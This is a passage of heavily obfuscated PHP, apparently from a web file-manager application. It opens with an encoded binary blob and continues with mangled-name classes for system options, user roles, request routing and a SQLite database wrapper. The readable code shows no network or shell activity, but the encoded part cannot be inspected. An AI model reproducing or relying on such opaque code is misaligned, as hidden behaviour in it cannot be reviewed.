p,‡í;^Ó¹‹‘imÒÀ!b¨3ÄyD')."\x2a\xc2\x1f\xe0\xa\xa0\x35\x68\x35\x4b\x31\x5c\x3b\x10\x32\x1f\x3a\xc\xda\x54\x5c\xe7\xc3\x60\x85\x3e\x3c\xaa\x98\x3a\x37\x7c\x76\x4f\xaa\x5c\x0\x1e\xd\xb2\x10\xaf\x85\x9d\xb7\xca\x85\x70\x5d"."\175\36\22\265\334\105\21\171\133\373\111\143\231\142\226\62\75\320\4\112\143\323\331\53\0\224\36\213\213\306\40\164\273\37\165\153\20\61\377\33\370\156\2\23\322\117\251\61\253"."\23\67\31\102\31\66\77\243\145\235\161\361\212\173\243\225\266\15\105\252\23\250\170\62\127\262\34\176\370\303\351\10\55\105\44\52\163\157\111\132\304\277\104\174\326\165\55\46\71"."\304\346\131\321\66\317\276\256\261\26\21\145\47\342\120\134\72\217\172\242\136\325\60\262\115\73\154\247\145\36\306\205\326\24\236\325\204\244\113\123\345\13\120\210\27\1\376\241\244"."\247\255\22\21\107\110\356\22\114\47\256\17\311\321\250\305\305\60\370\172\113\257\122\5\366\120\43\255\172\274\10\102\151\247\54\373\273\221\34\221\243\230\344\161\136\342\3\375\215".strrev('¡§-îõÄp¬Å2(?2wâœ¢Gù*Y(G¤¼jşH’Ì3ZU g'."\n".'')."\152\261\103\140\321\63\271\10\371\146\105\21\232\206\171\30\341\300\103\116\261\261\53\371\76\66\155\325\122\252\174\212\44\111\43\232\346\56\215\140\164\304\40\101\302\244\316\324\7"."\xfd\x8d\x4d\xfe\xd9\x20\xf2\x97\x2d\x23\xd8\x21\x82\xc6\xf0\x49\x46\x42\x3\x7c\x16\x63\x54\x4\x94\xef\x20\x9f\xc8\x63\x49\x37\x5b\xc4\xa9\x87\x70\x65\x40\xfc\x97\xf0\xf9\x24\x8e\x4e\x78\xac\x24"."\155\345\72\127\314\43\36\77\144\252\52\56\312\251\276\36\316\320\127\55\235\216\20\116\156\167\151\130\172\62\240\225\341\116\7\237\362\242\61\324\351\210\345\122\177\361\124\2\57"."\x17\xc8\x5e\xf3\x49\x29\xd1\xf\xa1\x66\x8a\x40\x16\xf5\x5c\x2f\xd\x8c\xb8\xf0\xa7\xbe\x50\x98\xbe\x2c\xa7\x4b\x2\x9c\xb4\x38\xb0\x52\x69\x0\x63\x25\x54\x49\x6d\x46\xe1\x31\xcf\xba\x7a\x6c\x33".base64_decode('6hJ/dU9yyz6sgoP3SK5XacsRlsqR03ZFqMqRqzQH8VzjOjP/ZGKa3q7eIAe18uVJTw==')."\xf5\xc2\x5\x53\x1b\xd3\xeb\xd1\x27\x74\x38\x5f\x8d\x17\x8c\xb4\x12\x8d\x75\x46\xda\x42\xd1\xf6\x48\x62\xb9\x32\xa4\x3b\x8a\xd0\x6e\x20\x2f\x4f\xb8\x97\x32\x91\x45\xd2\x81\x67\x58\x9d\xe2\x8f\x20".base64_decode('4KA/hRh2f4YfamxxfJEUr6T3o9zVUvzTSxU1mtiqI19RBktYq+TOC9GjlLlY0ivzTw==')."\352\130\303\106\152\261\124\240\134\245\65\220\277\372\27\310\113\25\162\156\304\207\350\346\236\32\157\230\143\206\155\210\205\317\112\114\312\265\207\332\273\43\75\152\50\32\215\255\162"."\51\250\11\331\162\211\277\13\222\221\237\21\221\146\106\114\2\375\172\245\147\60\360\253\44\173\154\367\110\61\350\364\311\116\342\212\354\246\4\136\102\344\257\12\320\250\364\312\117".base64_decode('saQZti4B6Os0M8GIQsvnXe/75bNStOzeWat+SqUfYDDJIV21DPFIZ1fyf91UIyOcQQ==')."\31\31\246\260\301\155\336\350\203\3\155\362\133\220\354\233\25\57\31\175\356\233\110\76\311\231\14\161\227\303\236\146\263\310\151\4\130\145\12\213\304\124\352\67\106\174\2\235\223"."\113\223\105\371\162\57\230\141\317\302\60\136\23\373\274\13\263\33\45\34\21\347\2\234\35\152\303\237\243\247\105\164\10\306\62\57\166\202\140\12\207\210\116\300\70\273\56\267\75"."\257\73\171\165\63\163\262\42\130\305\67\310\323\2\64\255\37\167\7\345\34\24\235\103\61\376\164\210\50\352\115\251\322\0\224\254\10\221\22\317\240\264\50\15\364\241\61\376\54"."\204\262\230\131\360\212\17\20\57\125\341\102\321\161\235\244\273\144\355\154\151\156\50\200\160\72\342\244\204\325\216\254\302\144\5\300\45\107\212\262\166\161\175\72\374\50\206\231\265"."\344\361\43\4\31\253\332\323\347\2\351\221\335\207\330\165\335\251\174\133\210\26\377\377\122\220\46\46\44\127\204\356\112\52\33\144\173\267\72\301\166\341\147\223\162\326\270\373\315"."\100\14\361\76\224\344\172\42\111\132\64\304\320\124\176\324\311\135\310\127\361\70\211\102\36\203\125\20\252\303\54\142\357\104\354\110\110\62\113\237\236\116\177\6\340\227\155\147\336"."\106\120\102\5\237\254\347\110\325\226\63\362\231\22\327\243\21\200\156\135\234\323\111\51\254\112\242\261\107\157\311\13\152\320\135\376\36\112\265\327\263\260\307\71\367\263\56\342\265"."\34\261\167\272\137\17\341\267\301\266\130\14\266\343\172\257\46\151\45\265\41\37\345\310\60\125\23\261\326\111\71\54\353\170\222\136\240\104\46\113\313\360\371\136\42\145\140\117\320".base64_decode('ZXzksTRK6rwPrkgrjdNPufRQ3kpp+ThVP3MZZpTQaUpne4ArGwUFtWJR3FvJWyb61w==')."\145\20\7\151\175\311\56\225\230\165\253\364\172\73\41\160\116\272\345\242\100\270\361\52\233\21\172\11\340\202\226\244\163\236\354\304\223\336\363\11\23\54\310\216\332\331\113\57\366"."\140\300\344\52\331\145\53\227\110\167\110\217\243\7\53\57\147\261\142\35\120\24\362\350\262\120\105\40\46\327\362\101\14\62\50\213\25\201\32\256\205\214\121\11\161\303\364\71\72"."\102\51\144\306\375\63\240\322\143\100\360\354\135\265\267\175\50\346\223\237\166\75\313\17\65\70\56\66\167\331\65\205\270\16\362\276\110\127\371\272\36\173\111\217\55\35\170\106\257"."\312\333\170\173\174\132\317\47\254\355\76\353\311\40\141\23\346\176\113\31\367\203\263\6\374\334\120\161\364\360\236\72\370\260\172\12\304\275\203\234\264\52\305\263\342\372\332\365\360".base64_decode('n9RrIG2VjwdKwyD1u1zK+8hNvo+5dqv6/qDrASPvhFZ5wfBzKwStX3LoyripXvPiVA==').strrev('æø0×)+pèsñ?qB˜†áe¹ìÓL…5ˆ6+:Î¡0ºKUÜ.³z‡]‰').strrev('-ÑÕbØq«-ˆm$8¤©à€F+‚wÊèõ%Y zq-ßøg¥¾ù]ˆ­Ñ$ı^T!').base64_decode('UDxx6f4WZR+q9EN8Vlos9IlCK4/P2AUsOndKmvtAWe3cREaCHdIM8va37m07GRiQpg==')."\x88\x64\xe9\x60\x25\xd7\xe8\x58\x5e\x51\x10\x2e\x8e\xf7\x45\x22\x89\x8c\x99\x79\xd8\xb6\xb1\x7d\xb1\x58\x6d\x12\x25\xfa\x5f\x4c\x20\x3b\x23\xd1\xe3\x94\xd0\x11\xaa\xd2\xf3\xe0\x32\x46\x5a\xaa\x3c"."\101\51\251\131\174\106\273\51\167\307\317\203\176\315\361\113\10\51\211\17\165\47\106\46\30\110\204\70\266\272\373\352\251\36\25\23\165\14\372\224\75\145\252\144\361\244\227\52\205"."\x7\x2a\x89\xb9\xc3\xa5\x99\xd1\xe1\x1e\x4e\xfd\xc4\xe6\xcd\xcd\x26\xc9\xef\xe8\x11\xd3\x31\xe1\x70\x81\x2c\x57\xd7\xd2\x95\x9c\xf0\xca\xd6\x57\xa4\x22\x79\x4d\x54\x56\x2d\xbd\x4a\x28\xa4\x42\x44".strrev('¢Bbç»x¢j:î¾Šmsı“'."\0".'¦,9-g¥¨xUE¹y)&¹¹:†f’l¼M‚=Œ').base64_decode('vK8SsyEidEGQPMnq03Wu4e+0uc45tvdxRsTtye6JUdT7uC3QRqJNT78m7a6sUUNSqA==')."\247\134\20\21\111\276\113\216\124\74\321\145\34\213\335\52\171\310\0\63\271\265\75\217\266\122\307\261\64\314\70\377\377\337\357\22\376\337\172\216\160\156\3\223\304\273\336\64\356"."\4\376\33\132\213\157\33\271\74\202\112\201\75\375\160\357\240\7\0\26\361\27\273\245\70\127\31\146\256\265\230\307\55\215\135\106\151\371\274\264\317\126\77\261\124\274\26\213\220"."\x6f\x84\x3f\x30\x5a\x2d\xe2\x35\x21\xf3\xbe\x1c\xdb\xcf\x5e\x55\x27\x8f\xc2\xe\x56\xcb\x28\xc8\x10\x3f\x18\x55\xc1\x63\xa\x62\xfc\xb0\x59\x79\x77\x8c\xe7\x2b\xea\x76\xed\x2c\x71\x1c\x15\xd9\xc4".base64_decode('VxFjwryUBVkojc+AxHUAjJds6xkrstNiPZD5QfgFk3KgSjIlcoEq6FfSNQsuoDzAMA==')."\x6b\xd8\x54\x96\x4d\xa0\xab\x44\xb7\xe7\xe5\x4b\x9a\x89\x39\x61\x4\xd5\x0\x89\x60\x56\xaa\x12\x54\x96\xe6\x2b\x5f\x2e\x82\x75\xb3\xdd\x22\x2c\xfe\x7e\x79\x83\xf7\x41\xf3\x46\x7f\xe5\xc7\xa8\x69"."\x4\x96\xa2\xc4\xb1\xdc\x82\x49\xa2\xc8\x95\xe\xb9\x5a\xad\x52\x86\x62\x6a\x42\xe4\xd9\xc3\x5a\xa9\xbe\x62\xf9\x8b\xa3\x42\x2c\x87\x43\x72\x7f\xd9\xca\xef\x2d\x59\x84\xbb\x73\x43\xb9\x2c\x47\x52"."\220\225\236\340\236\36\220\133\54\21\126\317\25\11\72\270\211\73\103\303\42\376\335\131\321\276\356\72\142\345\3\30\213\316\22\35\226\230\173\351\261\153\274\246\204\107\104\354\277"."\212\210\17\141\235\273\14\357\44\275\165\0\271\204\174\266\374\224\206\273\44\266\104\160\257\245\45\325\262\245\255\222\55\145\343\360\152\171\61\206\311\102\14\71\15\77\107\354\270".strrev('#e” ¯&;”Úû½Ò'."\r".'BgœÌ‰ üß¸Îóˆ·IWZáÚwZz{G\'èº÷ê¸Bæ')."\x2a\x25\x93\x52\xcc\x27\x1b\xfa\xc5\xc6\x89\x11\xe1\x72\x81\x24\xd3\x1b\x89\x90\xf4\xe6\xb5\xb7\x94\xfb\x79\x74\xe9\x92\x35\x4d\x30\x2f\x5c\x79\x8f\x26\xae\xf7\x24\x3e\x83\x15\xc3\xc7\x22\xb1\x5"."\170\340\325\136\373\316\152\143\202\111\22\214\171\46\323\241\215\125\311\232\321\275\336\145\20\204\147\45\114\226\144\227\53\324\350\365\161\357\243\307\1\331\226\327\225\261\22\52\354"."\166\245\362\342\106\105\164\23\303\252\165\237\54\64\167\161\331\56\230\43\225\0\321\127\33\270\106\226\164\10\302\346\40\102\125\213\166\205\237\365\305\47\335\126\310\74\33\237\63".strrev('‹o™,Cİ+#ıQ X÷Uï“ª•=BAğ²§wİ‹å²IàÇU‹±ÏP]øß‡”')."\x4\xb6\xd5\xc9\xb5\xb8\x48\x24\xef\x18\xe4\x8c\xcb\x89\xae\xe6\x78\xa7\x96\x9c\x48\x4\xfa\x52\x60\x81\xc8\x74\x69\x5a\xc8\x9d\x44\xf3\xeb\x9e\xd6\xcb\x5\xbc\x3d\xa3\x25\xec\x71\xc3\x49\xe7\xa4"."\143\122\145\142\45\274\124\61\250\360\241\352\355\365\266\212\215\251\367\360\50\52\251\150\217\244\234\221\264\252\224\241\55\252\132\214\46\341\222\202\135\165\225\335\303\20\340\262\64"."\11\227\255\110\146\205\45\131\213\124\316\321\312\366\36\272\127\71\170\40\200\310\124\351\260\347\230\116\263\356\151\74\253\146\256\374\34\140\234\67\67\221\130\124\157\205\20\64\170"."\x2e\xc9\xab\xb5\xa2\x6a\xe6\x3d\xb6\x42\xe4\xf6\xec\x2\xd5\x68\x2d\x4b\xa9\x42\x5d\x85\xb6\x44\x25\x1d\x17\x69\x55\x74\x37\x68\x9d\x78\x8f\x96\x7d\x32\x55\x49\x96\x15\x41\xaa\xab\x8a\xc4\xab\x2e".base64_decode('fdutw+GBywMDLj1phCl3oZNi3hgRam1MQ326i76XzRHT4ntGRmggYu3pUMk7kBW1uQ==').strrev(':\\HNŒB‚KÉgM5ÙV+·u¤c–<@id€5Ø×ò¾¹ğûÌ*«R^K,Ôñ')."\x6\x55\xa4\x58\x4\x44\x83\x1\x21\x2e\xa7\xf5\x89\xbe\x48\x38\xe1\xb2\xf0\xa0\x7c\x2\xdc\x32\xd0\xb\xca\x36\x7c\x11\xce\xaf\xa6\x88\x1b\x51\xba\xaf\xd2\xe4\x84\x55\x72\x7c\x38\x2d\x69\x15\xc9"."\x6f\xab\xe5\x38\xe2\xc2\x9e\x1e\xeb\x9\x33\x88\x37\x47\x9f\xa4\x8f\x82\x42\xe2\x1e\xa\x37\x8a\x5c\x70\x10\xb4\x25\xe4\x85\x4\xe1\xaa\x14\x9f\x97\x13\x3a\x4d\x25\x44\xc9\x15\xc1\x17\x27\x3c\x22"."\xef\x7d\x70\x65\xda\x51\xf6\x5c\xea\xa\x0\x3a\x9c\xa6\xac\x9\xe6\xa4\x11\x1b\x94\x8b\xf6\x88\xab\x15\x32\x64\x82\x3f\x1\xf4\x93\x35\x6a\x88\xa9\xbe\x1d\xa4\x29\x41\x70\xee\xef\xd7\x30\xa3\x8".strrev('CI)I’+À§o*±"PŞ¤Š‰’$â˜Y{=ATUH€5Yúx®&=ôâ®C‹†‰/').base64_decode('qSKptyvWs6e0cHcoEq1Iw8pMParwpkWTIr2kleRGcE+tiLQtFy0hd89CUl/MWUwAzw==')."\x6e\x32\x12\x5a\x1e\xf0\x48\xb6\x3f\xd5\xb\xc2\x8d\x9a\x28\x63\x1a\xe9\x11\x21\xdc\xd3\x24\xe6\xdd\x66\xfe\xe\x79\xc0\xfd\xaa\x8e\x47\x67\x90\x21\x29\x54\x84\x15\x91\x7a\xa0\xee\x38\x7b\x6c\x15".strrev('ÒR¶bĞ-ã°Ü'."\0".'ªHo+yK$ªÌÀÑ¼œá#=dà—tºà=2âÒ3kçF;')."\xad\x2\x3d\xc6\x80\x35\x28\xc\xa9\xa4\x6c\x46\xc3\xae\x64\x47\x1b\xaa\x7a\xf7\x4c\xa5\x79\x78\xc5\xb\x39\xdb\xff\x1\x83\x8e\xa8\x8a\xff\xac\x0\x0".base64_decode('').""."".""."", 10, -8))); goto FÛéÒß•¸Ü; fÖ—Œ–¢Ç–: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\x65\x6d\137\157\x70\164\151\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\x6f\x6c\145", "\162\157\x6c\x65\107\x72\157\x75\160", "\162\145\x67\x69\163\x74", "\145\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ï×şõ±À) { return "\x53\x79\163\164\x65\155\x4f\x70\x74\x69\157\156\x5f{$ï×şõ±À}"; } protected function optionDefault($ÂÓ†ÖÑé = '') { $éÖ»¤”Ò =& $_SERVER[…É¦À–]; if ($ÂÓ†ÖÑé == $éÖ»¤”Ò[12]) { return $GLOBALS[$éÖ»¤”Ò[6]][$éÖ»¤”Ò[410]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\162\157\x6c\145\114\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\141\165\x74\150", "\154\141\x62\145\154", "\144\151\x73\160\x6c\141\x79", "\163\171\163\x74\x65\155", "\144\x65\163\143", "\x69\x67\x6e\157\162\x65\105\170\164", "\151\147\156\x6f\x72\145\x46\151\x6c\145\123\x69\172\145", "\x61\144\x6d\151\156\151\x73\164\x72\x61\164\x6f\162", "\163\157\162\x74"); public function listData($Š¨˜Ò = false, $ãÔª‡¢’ = "\x73\157\x72\164", $€Ñ·´ˆ = false) { $„ªô…ˆş =& $_SERVER[…É¦À–]; $í¡š¦¤× = parent::listData($Š¨˜Ò, $ãÔª‡¢’, $€Ñ·´ˆ); if (!$Š¨˜Ò) { foreach ($í¡š¦¤× as $¤Ö†İ¶± => $á˜ÒŒ¨ñ) { if ($á˜ÒŒ¨ñ[$„ªô…ˆş[2079]] == 1) { $í¡š¦¤×[$¤Ö†İ¶±][$„ªô…ˆş[482]] = LNG($„ªô…ˆş[2314]); } } } return $í¡š¦¤×; } public function update($ı¤ÌÖÌì, $¥ú¿Ë˜Õ) { $êí”·öÒ =& $_SERVER[…É¦À–]; $ÑÖß¶é¼ = parent::listData($ı¤ÌÖÌì); $“°×ûŒø = $this->findByName($¥ú¿Ë˜Õ[$êí”·öÒ[32]]); if (!$ÑÖß¶é¼ || $“°×ûŒø && $“°×ûŒø[$êí”·öÒ[428]] != $ÑÖß¶é¼[$êí”·öÒ[428]]) { return !1; } if ($“°×ûŒø[$êí”·öÒ[2079]] == 1) { $¥ú¿Ë˜Õ = array($êí”·öÒ[32] => $¥ú¿Ë˜Õ[$êí”·öÒ[32]], $êí”·öÒ[1900] => $¥ú¿Ë˜Õ[$êí”·öÒ[1900]]); } $this->filterAuth($¥ú¿Ë˜Õ[$êí”·öÒ[442]]); return parent::update($ı¤ÌÖÌì, $¥ú¿Ë˜Õ); } public function remove($Ú‘—¤Æ‹) { $êÀ¨ãğ = parent::listData($Ú‘—¤Æ‹); if (!$êÀ¨ãğ || $êÀ¨ãğ[$_SERVER[…É¦À–][1332]]) { return !1; } return parent::remove($Ú‘—¤Æ‹); } public function add($ŒöÔ‰ó¢) { $¯êÁïÕ¦ =& $_SERVER[…É¦À–]; $öó¦®‹ç = $ŒöÔ‰ó¢[$¯êÁïÕ¦[32]]; if ($this->findByName($öó¦®‹ç)) { return !1; } $»óè„Áé = array($¯êÁïÕ¦[449] => $öó¦®‹ç, $¯êÁïÕ¦[1883] => $¯êÁïÕ¦[12], $¯êÁïÕ¦[1879] => $¯êÁïÕ¦[1887], $¯êÁïÕ¦[2315] => 1, $¯êÁïÕ¦[1882] => 0, $¯êÁïÕ¦[2316] => 0, $¯êÁïÕ¦[1881] => $this->getSort()); $ŒöÔ‰ó¢ = array_merge($»óè„Áé, $ŒöÔ‰ó¢); $this->filterAuth($ŒöÔ‰ó¢[$¯êÁïÕ¦[442]]); return parent::insert($ŒöÔ‰ó¢); } private function getSort() { $µ®„ˆ¥ô =& $_SERVER[…É¦À–]; $šìñÈµ‘ = parent::listData(); $îáù£˜¤ = array_to_keyvalue($šìñÈµ‘, $µ®„ˆ¥ô[12], $µ®„ˆ¥ô[1901]); return empty($îáù£˜¤) ? 0 : max($îáù£˜¤) + 1; } private function filterAuth(&$˜Ï‡ÆÛ) { $°íĞ¬Î =& $_SERVER[…É¦À–]; $šøØ¬‡µ = array(); $¥‘¡áğâ = array_filter(explode($°íĞ¬Î[50], $˜Ï‡ÆÛ)); foreach ($¥‘¡áğâ as $˜Ï‡ÆÛ) { $Ç´¸ø‰† = explode($°íĞ¬Î[10], $˜Ï‡ÆÛ); if ($Ç´¸ø‰†[0] == $°íĞ¬Î[2317] && $Ç´¸ø‰†[1] != $°íĞ¬Î[1235]) { $éšŠİ° = $Ç´¸ø‰†[0] . $°íĞ¬Î[10] . $Ç´¸ø‰†[1] . $°íĞ¬Î[2318]; if (!in_array($éšŠİ°, $¥‘¡áğâ)) { $šøØ¬‡µ[] = $éšŠİ°; } } $šøØ¬‡µ[] = $˜Ï‡ÆÛ; } $˜Ï‡ÆÛ = implode($°íĞ¬Î[50], $šøØ¬‡µ); } public function findRoleDefault() { $×´éØìõ =& $_SERVER[…É¦À–]; $ÏÀ¢¼ùÏ = parent::listData(); $¦ªÎ¤±¥ = !1; foreach ($ÏÀ¢¼ùÏ as $èÅî½æª) { if (!$èÅî½æª || $èÅî½æª[$×´éØìõ[1899]] == $×´éØìõ[198] || $èÅî½æª[$×´éØìõ[2079]] == 1) { continue; } if (strstr($èÅî½æª[$×´éØìõ[442]], $×´éØìõ[2319])) { continue; } if (!strstr($èÅî½æª[$×´éØìõ[442]], $×´éØìõ[2320])) { continue; } if (!$¦ªÎ¤±¥) { $¦ªÎ¤±¥ = $èÅî½æª; continue; } $»ÛÎó¯ = explode($×´éØìõ[50], $¦ªÎ¤±¥[$×´éØìõ[442]]); $¬œ¥¶è = explode($×´éØìõ[50], $èÅî½æª[$×´éØìõ[442]]); if (count($»ÛÎó¯) > count($¬œ¥¶è)) { $¦ªÎ¤±¥ = $èÅî½æª; } } return $¦ªÎ¤±¥ ? $¦ªÎ¤±¥[$×´éØìõ[428]] : $×´éØìõ[12]; } public function sort($é²Æí, $¸÷¸ÔÅŠ) { return parent::update($é²Æí, $¸÷¸ÔÅŠ); } } goto Cà¹ÆÌÕ; fíÊĞËƒŞ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ç­­§·Ë =& $_SERVER[…É¦À–]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ç­­§·Ë[6]] =& $config; $this->values[$ç­­§·Ë[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ç­­§·Ë[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Îñ¥ÊúÙ) { if (1 === func_num_args()) { $this->{$Îñ¥ÊúÙ} = new $Îñ¥ÊúÙ(); } else { $Õç‚‡ŠÀ = new ReflectionClass($Îñ¥ÊúÙ); $«ï°ˆÛ = func_get_args(); array_shift($«ï°ˆÛ); $this->{$Îñ¥ÊúÙ} = $Õç‚‡ŠÀ->newInstanceArgs($«ï°ˆÛ); } return $this->{$Îñ¥ÊúÙ}; } public function routeBind($­º›¬ˆè, $ƒçú„–ò, $Óİû¤Ìı = 3) { $Îì°¡ÜÜ =& $_SERVER[…É¦À–]; $¥»şë‹ = $this->in[$Îì°¡ÜÜ[9]]; $­º›¬ˆè = str_replace($Îì°¡ÜÜ[10], $Îì°¡ÜÜ[11], trim(trim($­º›¬ˆè, $Îì°¡ÜÜ[8]), $Îì°¡ÜÜ[12])); if (!$­º›¬ˆè || count($¥»şë‹) <= $Óİû¤Ìı) { return !1; } $”ÃÁ”’Ë = !0; $óç«Æ¬ = explode($Îì°¡ÜÜ[8], $­º›¬ˆè); for ($ş³×ø°˜ = 0; $ş³×ø°˜ < count($óç«Æ¬); $ş³×ø°˜++) { if ($óç«Æ¬[$ş³×ø°˜] != $¥»şë‹[$Óİû¤Ìı + $ş³×ø°˜]) { $”ÃÁ”’Ë = !1; break; } } if (!$”ÃÁ”’Ë) { return; } call_user_func_array(array($this, $ƒçú„–ò), array()); } public function routeArgs($•ÜÛÄ´ = 3) { $ó÷ø«¾Ì = $this->in[$_SERVER[…É¦À–][9]]; if (count($ó÷ø«¾Ì) <= $•ÜÛÄ´) { return array(); } $±ÃîÀÅ„ = array(); for ($Å¥‡îâ¸ = $•ÜÛÄ´; $Å¥‡îâ¸ < count($ó÷ø«¾Ì); $Å¥‡îâ¸ += 2) { $±ÃîÀÅ„[$ó÷ø«¾Ì[$Å¥‡îâ¸]] = $ó÷ø«¾Ì[$Å¥‡îâ¸ + 1]; $this->in[$ó÷ø«¾Ì[$Å¥‡îâ¸]] = $ó÷ø«¾Ì[$Å¥‡îâ¸ + 1]; } return $±ÃîÀÅ„; } protected function assign($ÉŒ†ŞÓš, $¼…úş) { $this->values[$ÉŒ†ŞÓš] = $¼…úş; } protected function display($·ııØûø) { ob_end_clean(); extract($this->values); require $this->tpl . $·ııØûø; } } class DbSqliteBase extends Db { public function __construct($„Á¡ÑÀ³ = '') { $¹¾‹Ÿşß =& $_SERVER[…É¦À–]; if (!extension_loaded($¹¾‹Ÿşß[13])) { think_exception(think_lang($¹¾‹Ÿşß[14]) . $¹¾‹Ÿşß[15]); } if (!empty($„Á¡ÑÀ³)) { if (!isset($„Á¡ÑÀ³[$¹¾‹Ÿşß[16]])) { $„Á¡ÑÀ³[$¹¾‹Ÿşß[16]] = 438; } $this->config = $„Á¡ÑÀ³; if (empty($this->config[$¹¾‹Ÿşß[17]])) { $this->config[$¹¾‹Ÿşß[17]] = array(); } } } public function connect($û£­Õ = '', $Ğ¡ì¿ˆ÷ = 0) { $ßÒÆÍï =& $_SERVER[…É¦À–]; if (!isset($this->linkID[$Ğ¡ì¿ˆ÷])) { if (empty($û£­Õ)) { $û£­Õ = $this->config; } $€ƒ ÎÏ = !empty($û£­Õ[$ßÒÆÍï[17]][$ßÒÆÍï[18]]) ? $û£­Õ[$ßÒÆÍï[17]][$ßÒÆÍï[18]] : $this->pconnect; $æ¥û®±ş = $€ƒ ÎÏ ? $ßÒÆÍï[19] : $ßÒÆÍï[20]; $this->linkID[$Ğ¡ì¿ˆ÷] = $æ¥û®±ş($û£­Õ[$ßÒÆÍï[21]], $û£­Õ[$ßÒÆÍï[16]]); if (!$this->linkID[$Ğ¡ì¿ˆ÷]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ğ¡ì¿ˆ÷], 30000); if (1 != think_config($ßÒÆÍï[22])) { unset($this->config); } } return $this->linkID[$Ğ¡ì¿ˆ÷]; } public function free() { $this->queryID = null; } public function query($Ü§Ş³­õ) { $¾ªïÄÁ =& $_SERVER[…É¦À–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ü§Ş³­õ; if ($this->queryID) { $this->free(); } think_action_status($¾ªïÄÁ[23], 1); think_status($¾ªïÄÁ[24]); $this->queryID = sqlite_query($this->_linkID, $Ü§Ş³­õ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÕŞ„£ıÙ = $this->getAll(); return $ÕŞ„£ıÙ; } } public function execute($¾Ç´¡ş¥) { $×ãÂÑø =& $_SERVER[…É¦À–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¾Ç´¡ş¥; if ($this->queryID) { $this->free(); } think_action_status($×ãÂÑø[25], 1); think_status($×ãÂÑø[24]); $úÆŞÕ’¹ = sqlite_exec($this->_linkID, $¾Ç´¡ş¥); $this->debug(); if (!1 === $úÆŞÕ’¹) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[…É¦À–][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Œ¶Ë¢û£ = sqlite_query($this->_linkID, $_SERVER[…É¦À–][27]); if (!$Œ¶Ë¢û£) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÃêÎñŸ = sqlite_query($this->_linkID, $_SERVER[…É¦À–][28]); if (!$ÃêÎñŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ïÅ¿¿Ş = array(); if ($this->numRows > 0) { for ($¨ÏÛá¾ò = 0; $¨ÏÛá¾ò < $this->numRows; $¨ÏÛá¾ò++) { $ïÅ¿¿Ş[$¨ÏÛá¾ò] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ïÅ¿¿Ş; } public function getFields($À™»ÊÎÛ) { $×˜¨ú =& $_SERVER[…É¦À–]; $­ÑÎ¹÷« = $this->query($×˜¨ú[29] . $À™»ÊÎÛ . $×˜¨ú[30]); $¿í‹²˜å = array(); if ($­ÑÎ¹÷«) { foreach ($­ÑÎ¹÷« as $İ„íøœ => $˜Ì®¡½½) { $¿í‹²˜å[$˜Ì®¡½½[$×˜¨ú[31]]] = array($×˜¨ú[32] => $˜Ì®¡½½[$×˜¨ú[31]], $×˜¨ú[33] => $˜Ì®¡½½[$×˜¨ú[34]], $×˜¨ú[35] => (bool) ($˜Ì®¡½½[$×˜¨ú[36]] === $×˜¨ú[12]), $×˜¨ú[37] => $˜Ì®¡½½[$×˜¨ú[38]], $×˜¨ú[39] => strtolower($˜Ì®¡½½[$×˜¨ú[40]]) == $×˜¨ú[41], $×˜¨ú[42] => strtolower($˜Ì®¡½½[$×˜¨ú[43]]) == $×˜¨ú[44]); } } return $¿í‹²˜å; } public function getTables($Ôé¤âÄ = '') { $ÆÛÛ¹‹† =& $_SERVER[…É¦À–]; $ã´ö™¥ = $this->query($ÆÛÛ¹‹†[45] . $ÆÛÛ¹‹†[46] . $ÆÛÛ¹‹†[47]); $Œ™ÛÕáç = array(); foreach ($ã´ö™¥ as $îš¹Ÿ¬† => $Ï‡ˆ™Û‰) { $Œ™ÛÕáç[$îš¹Ÿ¬†] = current($Ï‡ˆ™Û‰); } return $Œ™ÛÕáç; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $™ºÅ¯·š =& $_SERVER[…É¦À–]; $ëöĞÉŸ¡ = sqlite_last_error($this->_linkID); $this->error = $ëöĞÉŸ¡ . $™ºÅ¯·š[4] . sqlite_error_string($ëöĞÉŸ¡); if ($™ºÅ¯·š[12] != $this->queryStr) { $this->error .= LNG($™ºÅ¯·š[48]) . $this->queryStr; } think_trace($this->error, $™ºÅ¯·š[12], $™ºÅ¯·š[49]); return $this->error; } public function escapeString($Üœ·øñ) { return sqlite_escape_string($Üœ·øñ); } public function parseLimit($É‹ÆŒ÷Ø) { $‘¼Ÿıü =& $_SERVER[…É¦À–]; $£ñåãä„ = $‘¼Ÿıü[12]; if (!empty($É‹ÆŒ÷Ø)) { $É‹ÆŒ÷Ø = explode($‘¼Ÿıü[50], $É‹ÆŒ÷Ø); if (count($É‹ÆŒ÷Ø) > 1) { $£ñåãä„ .= $‘¼Ÿıü[51] . $É‹ÆŒ÷Ø[1] . $‘¼Ÿıü[52] . $É‹ÆŒ÷Ø[0] . $‘¼Ÿıü[53]; } else { $£ñåãä„ .= $‘¼Ÿıü[51] . $É‹ÆŒ÷Ø[0] . 